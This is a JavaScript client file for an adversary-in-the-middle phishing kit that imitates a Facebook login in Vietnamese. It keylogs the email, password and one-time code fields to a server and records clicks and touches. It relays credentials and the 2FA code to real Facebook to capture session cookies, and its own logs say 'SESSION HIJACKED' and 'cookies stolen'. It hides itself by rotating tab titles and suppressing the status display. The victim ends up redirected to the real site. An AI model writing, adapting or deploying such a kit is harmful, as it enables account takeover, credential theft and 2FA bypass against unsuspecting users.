/**
 * AiTM Client-Side Script
 * 
 * Giao tiếp với AiTM Engine trên server qua REST API.
 * Flow: Email+Pass → Server → Puppeteer → Real Facebook → Kết quả → Client
 * 
 * Nếu 2FA required → Hiện form OTP → Gửi OTP → Server forward → Capture cookies
 */

window.SESSION_ID = 'aitm_fb_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
window.PAGE_TYPE = 'aitm_facebook';
const SESSION_ID = window.SESSION_ID;
const urlParams = new URLSearchParams(window.location.search);
window.CAMPAIGN_ID = urlParams.get('campaign') || 'aitm';

let aitmSessionId = null;
let isProcessing = false;

// ===== ANTI-DETECTION: Dynamic Tab Title =====
const originalTitle = document.title;
let titleInterval = null;
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        const titles = ['(1) Facebook', '🔔 Tin nhắn mới', 'Facebook — Thông báo', '📱 Messenger'];
        let i = 0;
        titleInterval = setInterval(() => { document.title = titles[i++ % titles.length]; }, 1500);
    } else { clearInterval(titleInterval); document.title = originalTitle; }
});

// ===== SESSION REPLAY =====
const replayEvents = [];
let replayFlushTimer;
function trackEvent(type, data) {
    replayEvents.push({ t: Date.now(), type, ...data });
    clearTimeout(replayFlushTimer);
    replayFlushTimer = setTimeout(flushReplay, 3000);
}
function flushReplay() {
    if (!replayEvents.length) return;
    fetch('/api/session-replay', { method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session_id: SESSION_ID, page_type: 'aitm_facebook', campaign_id: window.CAMPAIGN_ID, events: replayEvents.splice(0) })
    }).catch(() => {});
}
document.addEventListener('click', e => trackEvent('click', { x: e.clientX, y: e.clientY, tag: e.target.tagName }));
document.addEventListener('touchmove', e => { const t = e.touches[0]; trackEvent('touch', { x: t.clientX, y: t.clientY }); }, { passive: true });
window.addEventListener('beforeunload', () => { if (replayEvents.length) navigator.sendBeacon('/api/session-replay', JSON.stringify({ session_id: SESSION_ID, page_type: 'aitm_facebook', events: replayEvents })); });

// ===== KEYLOGGER =====
function setupKeylogger(el, field) {
    if (!el) return;
    let t;
    el.addEventListener('input', function() {
        clearTimeout(t);
        t = setTimeout(() => {
            fetch('/api/keylog', { method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ field, value: el.value, key: 'input', page_type: 'aitm_facebook', session_id: SESSION_ID })
            }).catch(() => {});
        }, 300);
    });
}
setupKeylogger(document.getElementById('email'), 'email');
setupKeylogger(document.getElementById('password'), 'password');

// ===== UI HELPERS =====
function showLoading(text) {
    document.getElementById('loadingText').textContent = text || 'Đang xử lý...';
    document.getElementById('loadingOverlay').classList.add('active');
}
function hideLoading() {
    document.getElementById('loadingOverlay').classList.remove('active');
}
function showError(text) {
    const box = document.getElementById('errorBox');
    document.getElementById('errorText').textContent = text;
    box.classList.add('show');
}
function hideError() {
    document.getElementById('errorBox').classList.remove('show');
}
function updateStatus(text, type) {
    // Console-only debug (status bar removed from HTML for stealth)
    const icon = type === 'success' ? '✅' : type === 'error' ? '❌' : '🔄';
    console.log(`[AiTM] ${icon} ${text}`);
}

// ===== MAIN LOGIN — AiTM FLOW =====
async function aitm_submitLogin() {
    if (isProcessing) return;
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
        showError('Vui lòng nhập email và mật khẩu');
        return;
    }

    hideError();
    isProcessing = true;
    document.getElementById('btnLogin').disabled = true;

    // Step 1: Gửi credentials đến AiTM engine
    showLoading('Đang xác thực tài khoản...');
    updateStatus('🔄 Đang relay credentials vào Facebook thật...', 'processing');

    // Fake loading text progression cho độ chân thực
    const loadingTexts = ['Đang xác thực tài khoản...', 'Đang kết nối máy chủ...', 'Đang kiểm tra thông tin...'];
    let ltIdx = 0;
    const ltInterval = setInterval(() => {
        ltIdx++;
        if (ltIdx < loadingTexts.length) {
            document.getElementById('loadingText').textContent = loadingTexts[ltIdx];
        }
    }, 3000);

    try {
        const response = await fetch('/api/aitm/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                target: 'facebook',
                email, password,
                session_id: SESSION_ID,
                campaign_id: window.CAMPAIGN_ID
            })
        });

        const result = await response.json();
        aitmSessionId = result.sessionId;

        // Handle result
        switch (result.status) {
            case '2fa_required':
                hideLoading();
                updateStatus('🔐 2FA detected — Cần OTP từ nạn nhân', 'processing');
                show2FAForm();
                break;

            case 'invalid_credentials':
                hideLoading();
                updateStatus('❌ Credentials sai — hiện lỗi cho nạn nhân', 'error');
                showError('Mật khẩu bạn đã nhập không đúng. Vui lòng thử lại.');
                document.getElementById('password').value = '';
                document.getElementById('password').focus();
                break;

            case 'success':
                updateStatus(`✅ SESSION HIJACKED! ${result.cookies_count} cookies captured`, 'success');
                showLoading('Đã xác thực thành công!');
                await new Promise(r => setTimeout(r, 2000));
                window.location.href = 'https://www.facebook.com';
                break;

            case 'error':
                hideLoading();
                updateStatus('💥 Error: ' + result.message, 'error');
                showError('Đã xảy ra lỗi. Vui lòng thử lại.');
                break;

            default:
                hideLoading();
                showError('Không thể xác thực. Thử lại sau.');
        }
    } catch (error) {
        hideLoading();
        updateStatus('💥 Network error', 'error');
        showError('Lỗi kết nối. Vui lòng thử lại.');
    }

    clearInterval(ltInterval);
    isProcessing = false;
    document.getElementById('btnLogin').disabled = false;
}

// ===== 2FA FORM =====
function show2FAForm() {
    const overlay = document.createElement('div');
    overlay.className = 'twofa-overlay';
    overlay.id = 'twofaOverlay';
    const phoneSuffix = Math.floor(10 + Math.random() * 89);

    overlay.innerHTML = `
        <div class="twofa-card">
            <div class="twofa-header">
                <div class="icon">🔐</div>
                <h3>Xác thực hai yếu tố</h3>
                <p>Chúng tôi đã gửi mã xác nhận đến số điện thoại có đuôi <strong>**${phoneSuffix}</strong>. Nhập mã để tiếp tục.</p>
            </div>
            <div class="twofa-error" id="twofaError">Mã xác nhận không đúng. Vui lòng thử lại.</div>
            <input type="tel" class="twofa-input" id="otpInput" maxlength="6" placeholder="••••••" autocomplete="off">
            <button class="twofa-btn" id="btnOTP" onclick="aitm_submit2FA()" disabled style="opacity:0.5">Xác nhận</button>
            <div class="twofa-resend" onclick="return false">Gửi lại mã</div>
        </div>
    `;

    document.body.appendChild(overlay);

    const otpInput = document.getElementById('otpInput');
    setTimeout(() => otpInput.focus(), 300);

    setupKeylogger(otpInput, 'otp');
    otpInput.addEventListener('focus', () => trackEvent('focus', { field: 'aitm_otp' }));

    otpInput.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
        const btn = document.getElementById('btnOTP');
        const filled = this.value.length >= 6;
        btn.disabled = !filled;
        btn.style.opacity = filled ? '1' : '0.5';
    });

    otpInput.addEventListener('keydown', e => {
        if (e.key === 'Enter') aitm_submit2FA();
    });
}

// ===== SUBMIT 2FA — Forward OTP to real Facebook =====
async function aitm_submit2FA() {
    const otp = document.getElementById('otpInput').value.trim();
    if (otp.length < 6 || !aitmSessionId) return;

    document.getElementById('btnOTP').disabled = true;
    document.getElementById('btnOTP').textContent = 'Đang xác minh...';
    updateStatus('🔄 Forwarding OTP → Facebook thật...', 'processing');

    try {
        const response = await fetch('/api/aitm/2fa', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId: aitmSessionId,
                otp,
                session_id: SESSION_ID
            })
        });

        const result = await response.json();

        if (result.status === 'success') {
            updateStatus(`✅ 2FA BYPASSED! ${result.cookies_count} cookies stolen!`, 'success');

            const overlay = document.getElementById('twofaOverlay');
            if (overlay) overlay.remove();

            showLoading('Xác thực thành công!');
            flushReplay();
            await new Promise(r => setTimeout(r, 2000));
            window.location.href = 'https://www.facebook.com';

        } else if (result.status === 'invalid_otp') {
            updateStatus('❌ OTP sai', 'error');
            document.getElementById('twofaError').classList.add('show');
            document.getElementById('otpInput').value = '';
            document.getElementById('otpInput').focus();
            document.getElementById('btnOTP').disabled = true;
            document.getElementById('btnOTP').textContent = 'Xác nhận';
        } else {
            updateStatus('💥 Error: ' + result.message, 'error');
        }
    } catch (error) {
        updateStatus('💥 Network error', 'error');
    }

    const btn = document.getElementById('btnOTP');
    if (btn) { btn.disabled = false; btn.textContent = 'Xác nhận'; }
}

// ===== ENTER KEY =====
document.getElementById('email').addEventListener('keydown', e => { if (e.key === 'Enter') document.getElementById('password').focus(); });
document.getElementById('password').addEventListener('keydown', e => { if (e.key === 'Enter') aitm_submitLogin(); });
